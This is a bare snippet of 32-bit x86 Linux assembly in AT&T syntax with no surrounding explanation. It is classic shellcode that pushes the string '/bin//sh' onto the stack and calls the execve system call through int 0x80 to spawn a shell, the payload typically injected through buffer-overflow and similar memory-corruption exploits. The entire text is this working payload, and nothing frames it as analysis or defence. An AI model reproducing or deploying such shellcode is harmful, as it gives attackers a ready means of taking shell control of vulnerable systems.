xorl %ecx,%ecx;
mull %ecx;
push %eax;
push $0x68732f2f;
push $0x6e69622f;
mov %esp,%ebx;
mov $0xb,%al;
int $0x80;
